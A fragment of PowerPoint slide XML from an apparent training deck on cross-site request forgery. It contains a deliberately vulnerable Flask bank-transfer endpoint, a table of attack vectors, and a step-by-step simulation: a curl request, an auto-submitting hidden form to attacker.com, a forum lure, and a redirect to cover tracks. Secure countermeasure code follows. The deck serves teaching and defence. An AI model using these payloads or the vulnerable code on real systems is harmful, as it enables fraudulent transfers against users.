              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>({'status': 'Email updated'})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52968-C235-4964-8FFE-CD69843F7F1E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="796722" y="1242004"/>
            <a:ext cx="561512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# VULNERABLE: No CSRF protection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>from flask import Flask, request, session, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>jsonify</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>from models import Account, Transaction</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>import logging</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>app = Flask(__name__)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>app.secret_key</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t> = 'weak-secret-key'</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>@app.route('/api/transfer', methods=['POST'])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transfer_funds</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>():</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>    """</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>    VULNERABILITY: Only checks if user is logged in,</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>    no CSRF token validation!</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>    """</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>    # Check authentication</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>    if '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>user_id</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>' not in session:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>        return </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>jsonify</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>({'error': 'Unauthorized'}), 401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# ❌ NO CSRF TOKEN CHECK!</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>    # Attacker can forge requests from other sites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to_account</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>request.form.get</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>('</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>toAccount</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>')</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>    amount = float(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>request.form.get</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>('amount', 0))</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>    currency = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>request.form.get</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>('currency', 'USD’)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t># Get sender account</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>    sender = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>Account.query.get</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>(session['</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>user_id</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>'])</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>    receiver = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>Account.query.filter_by</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>account_number</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>to_account</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>).first()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if not receiver:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>        return </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>jsonify</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>({'error': 'Invalid account'}), 400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if </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>sender.balance</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t> &gt;= amount:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>        # Execute transfer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sender.balance</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t> -= amount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receiver.balance</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t> += amount</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/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5A8EC-1C58-463E-A04F-5C6FF9F223B8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="390523" y="928918"/>
            <a:ext cx="6427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Vulnerable Bank Application Code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: Save as with Python Extension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3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ADC440-743C-4003-8628-2AD7D92BA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275318"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="337351" y="2041476"/>
          <a:ext cx="11754033" cy="3329940"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="1901525">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2459929786"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="3383595">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3410273679"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="6468913">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="510990617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Vector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8375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GET-based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tags, links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`&lt;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img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src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="bank.com/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transfer?to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attacker&amp;amount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=1000"&gt;`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62323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POST-based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Hidden forms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Auto-submitting forms with hidden inputs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03710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AJAX/Fetch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XMLHttpRequest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`fetch('bank.com/api/transfer', {credentials: 'include'})`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00936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WebSocket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WebSocket connections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ws.send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JSON.stringify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({to: 'attacker', amount: 1000}))`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346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5B4ABB-D386-4BEB-B603-3FD934690D49}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3048740" y="34355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Vectors</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="303092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0C733-BA29-4E31-AC11-4D548C89575C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3340223" y="1748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Simulation Step by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A6CC6-7D3F-446A-A6F3-5B1B8068D60A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1562469" y="1858054"/>
            <a:ext cx="78101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Attacker identifies vulnerable endpoint</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>curl -X POST https://bank.com/api/transfer \</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>  -H "Cookie: session=abc123" \</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>  -d "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>toAccount</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>VICTIM&amp;amount</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>=100"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t># Response: {"status": "success"}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30CA5E-6D6B-4A44-BFE5-DBCA3BE4810F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1751121" y="135560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Step 1: Reconnaissance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8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0C733-BA29-4E31-AC11-4D548C89575C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3340223" y="1748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Simulation Step by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7BAE3-A0FA-460A-A3D0-5276EEC960CC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1928673" y="13378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Step 2: Craft Malicious Payload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68BBE-DD2B-4E94-8D26-196B9BA81096}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1056443" y="2000058"/>
            <a:ext cx="8378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// Attacker creates malicious page</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>const </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>maliciousHTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> = `</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>&lt;form action="https://bank.com/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>api</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>/transfer" method="POST"&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>  &lt;input type="hidden" name="</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>toAccount</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>" value="ATTACKER123"&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>  &lt;input type="hidden" name="amount" value="5000"&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>&lt;/form&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>&lt;script&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>document.forms</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>[0].submit();&lt;/script&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>`;</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="250222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0C733-BA29-4E31-AC11-4D548C89575C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3340223" y="1748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Simulation Step by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8AD27-82D4-403C-BF59-644C81C6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51" y="1531709"/>
            <a:ext cx="43323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Delivery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-apple-system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EE80B-E0AD-460D-9320-80B2557C877F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1216241" y="2392506"/>
            <a:ext cx="68957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Attacker posts link on forum:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>"🎮 Click here for free gaming credits! </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>https://attacker.com/free-credits.html"</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="299388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0C733-BA29-4E31-AC11-4D548C89575C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3340223" y="1748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Simulation Step by Step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EF1AB-1C12-4291-8394-37AEAB16F4E6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1307237" y="157755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Step 4: Execution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34F3A-E208-4AC4-B930-8FD50D7FD5D2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1511423" y="2355203"/>
            <a:ext cx="67448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Victim (logged into bank.com) → Clicks link</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>→ Browser loads attacker.com</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>→ Form auto-submits to bank.com</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>→ Bank processes transfer (has valid session cookie)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>→ $5000 transferred to attacker</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="399970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0C733-BA29-4E31-AC11-4D548C89575C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3340223" y="17487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Attack Simulation Step by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3F1A9-39C9-49B3-8AB2-F11304A2DAC3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1360503" y="179949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Step 5: Cover Tracks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1A079-BFE5-415E-B26D-6BC78519D340}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1216240" y="2485389"/>
            <a:ext cx="7969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// Redirect victim to legitimate page</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>setTimeout</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>(() =&gt; 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window.location</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> = "https://legitimate-gaming-site.com";</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>}, 2000);</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1586138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0DBA22-B0FD-4C90-B71F-F1C4D2898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02647"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="861134" y="1669002"/>
          <a:ext cx="10724226" cy="4114946"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="2539014">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3884289282"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="6116714">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="321327326"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2068498">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="576428445"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="58090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954527"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="58090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Anti-CSRF Tokens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Unique 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tokens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per session/</a:t>
                      </a:r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request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🔴 Critical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894321"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="89565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SameSite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Cookies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`Set-Cookie: session=xyz; SameSite=Strict`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🔴 Critical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054078"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="89565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Headers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`X-Requested-With: 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XMLHttpRequest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 for AJAX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High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56410"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="58090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Re-authentication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 password for sensitive actions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High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288829"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="58090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 Validation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Origin/Referer headers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High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1388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F2E400-0B36-4916-9D5E-896882A182DF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3047946" y="59146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 Strategies</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="420479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C23C0D-00EB-421F-91A1-04BFD7C3AF5D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="648069" y="102304"/>
            <a:ext cx="111503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Defense-in-Depth</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US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Layer 1: Server-Side (Python/Flask) / Save with Python Extension</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="1D1D1F"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="system-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BAB03-D3FC-47ED-9418-4A5C75A98570}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="896645" y="1179522"/>
            <a:ext cx="8602461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# SECURE: Comprehensive CSRF protection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0"/>
              <a:t>import secrets</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0"/>
              <a:t>import </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0" err="1"/>
              <a:t>hmac</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0"/>
              <a:t>from flask import Flask, request, session, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0" err="1"/>
              <a:t>jsonify</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0"/>
              <a:t>, abort, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0" err="1"/>
              <a:t>make_response</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0"/>
              <a:t>from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0" err="1"/>
              <a:t>flask_wtf.csrf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0"/>
              <a:t> import </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0" err="1"/>
              <a:t>CSRFProtect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app = Flask(__name__)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0" err="1"/>
              <a:t>app.config</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0"/>
              <a:t>['SECRET_KEY'] = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0" err="1"/>
              <a:t>secrets.token_hex</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0"/>
              <a:t>(32)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0" err="1"/>
              <a:t>csrf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0"/>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0" err="1"/>
              <a:t>CSRFProtect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0"/>
              <a:t>(app)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0"/>
              <a:t>@app.before_request</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0"/>
              <a:t>def </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0" err="1"/>
              <a:t>validate_csrf_token</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0"/>
              <a:t>():</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0"/>
              <a:t>    if </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0" err="1"/>
              <a:t>request.method</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0"/>
              <a:t> in ['POST', 'PUT', 'DELETE']:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0"/>
              <a:t>        token = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0" err="1"/>
              <a:t>request.headers.get</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0"/>
              <a:t>('X-CSRF-Token') or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0" err="1"/>
              <a:t>request.form.get</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0"/>
              <a:t>('</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0" err="1"/>
              <a:t>csrf_token</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0"/>
              <a:t>')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server_token</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0"/>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0" err="1"/>
              <a:t>session.get</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0"/>
              <a:t>('</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0" err="1"/>
              <a:t>csrf_token</a:t>
            </a:r>
